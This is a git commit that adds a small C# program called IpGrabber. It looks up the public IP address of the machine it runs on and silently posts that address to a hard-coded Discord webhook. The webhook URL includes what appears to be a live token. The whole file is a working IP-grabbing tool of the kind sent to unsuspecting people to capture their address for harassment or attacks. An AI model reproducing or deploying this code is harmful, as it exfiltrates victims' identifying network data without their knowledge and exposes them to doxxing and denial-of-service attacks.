13a662bb55d15124e7cced1f79a28aed58795ab6
Bill Armanidis <49584855+billarmanidis@users.noreply.github.com>
2021-11-19 21:42:10 +0200

    Add files via upload

---
+++ IpGrabber/Grabber.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace IpGrabber
+{
+    class Grabber
+    {
+        public static string rikked()
+        {
+            string ip = new WebClient().DownloadString("https://ip.seeip.org/jsonip?");
+            return ip;
+        }
+    }
+}
---
+++ IpGrabber/Program.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace IpGrabber
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string webhook = "https://discord.com/api/webhooks/911338915233935401/J--ja5mETW4iPBNoX6jxblQUSn9MLqfj4t8ZT9KwLEIZ-xUKUaZ_jnpBIEtZfgCcvEX1";
+
+
+            var wbc = new WebClient();
+            var data = new NameValueCollection();
+            data["content"] = Grabber.rikked();
+            wbc.UploadValues(webhook, data);
+
+        }
+
+    }
+}
